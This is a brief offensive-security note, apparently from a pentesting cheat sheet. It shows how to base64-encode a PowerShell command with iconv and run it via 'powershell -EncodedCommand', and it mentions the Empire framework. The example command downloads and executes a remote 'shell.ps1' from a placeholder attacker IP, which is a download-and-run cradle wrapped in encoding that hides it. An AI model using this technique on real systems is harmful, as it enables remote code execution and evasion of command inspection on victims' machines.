If you can't use quotes or otherwise, you can base64 encode commands with the iconv util

echo -n "IEX(New-Object Net.WebClient).downloadString('http://<IP>:8000/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0

and now in Windows/Powershell

"powershell -EncodedCommand <BASE64>"

Empire does this too and uses
powershell -enc to run commands
